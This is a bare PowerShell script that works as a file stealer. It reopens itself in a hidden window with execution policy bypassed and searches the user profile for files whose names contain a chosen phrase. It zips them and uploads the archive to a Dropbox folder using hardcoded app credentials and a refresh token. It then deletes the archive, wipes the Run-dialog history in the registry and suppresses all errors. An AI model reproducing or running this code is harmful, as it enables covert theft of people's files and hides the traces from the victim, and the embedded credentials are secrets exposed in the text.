[CmdletBinding(SupportsShouldProcess = $true)]
param(
    [Parameter(Mandatory=$false)]
    [string]$FileNamePhrase = "BWCZ",
    [Parameter(Mandatory=$false)]
    [switch]$IsHiddenInstance
)

try {
    if (-not $IsHiddenInstance.IsPresent) {
        $arguments = @("-NoP", "-NonI", "-W", "Hidden", "-EP", "Bypass", "-File", $PSCommandPath, "-IsHiddenInstance")
        if ($PSBoundParameters.ContainsKey('FileNamePhrase')) {
            $arguments += "-FileNamePhrase", $FileNamePhrase
        }
        $scriptContent = Get-Content -LiteralPath $PSCommandPath -Raw
		Start-Process powershell.exe -ArgumentList "-NoP -NonI -W Hidden -EP Bypass -Command $scriptContent -IsHiddenInstance"
        return
    }

    $dbxRefreshToken = "pzSx6bQFamEAAAAAAAAAAUba42fPaXTifbRbexPAFbnKo3nJ0wktp6SzG2yxVrNo"
    $dbxAppKey = "w9wsf86rg8rbhvv"
    $dbxAppSecret = "8ay3kjhh68t33f0"
    $dbxOutputFolder = "ScriptUploads"

    $searchPath = Join-Path $env:USERPROFILE "*$FileNamePhrase*"
    
    $allFiles = Get-ChildItem -Path $env:USERPROFILE -Include "*$FileNamePhrase*" -File -Recurse -ErrorAction SilentlyContinue
    $scriptDir = if ($PSCommandPath) { Split-Path -Path $PSCommandPath -Parent }
    
    $pathsToZip = $allFiles | Where-Object {
        -not ($scriptDir -and $_.FullName.StartsWith($scriptDir))
    } | Select-Object -ExpandProperty FullName

    if (-not $pathsToZip) {
        return
    }

    $zipName = "$([guid]::NewGuid()).zip"
    $zipPath = Join-Path -Path $env:TEMP -ChildPath $zipName
    
    Compress-Archive -LiteralPath $pathsToZip -DestinationPath $zipPath -Force

      if (Test-Path $zipPath) {
        
        $tokenBody = @{
            grant_type = "refresh_token"
            refresh_token = $dbxRefreshToken
            client_id = $dbxAppKey
            client_secret = $dbxAppSecret
        }
        
        $token = (Invoke-RestMethod "https://api.dropboxapi.com/oauth2/token" `
            -Method Post `
            -Body $tokenBody `
            -ContentType "application/x-www-form-urlencoded").access_token

        $dbxPath = "/$dbxOutputFolder/$zipName"
        $dbxApiArg = @{ path = $dbxPath; mode = 'add'; autorename = $true } | ConvertTo-Json -Compress
        
        $headers = @{
            Authorization = "Bearer $token"
            "Dropbox-API-Arg" = $dbxApiArg
        }
        
        Invoke-RestMethod "https://content.dropboxapi.com/2/files/upload" `
            -Method Post `
            -Headers $headers `
            -InFile $zipPath `
            -ContentType 'application/octet-stream'

        Remove-Item -LiteralPath $zipPath -Force
    }
}
catch {
    [void]$_
}
finally {
    [void](Remove-Item $zipPath -Force -EA 0 -ErrorVariable $null)
    [void](Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -Force -EA 0 -ErrorVariable $null)
    [GC]::Collect()
    [GC]::WaitForPendingFinalizers()

}
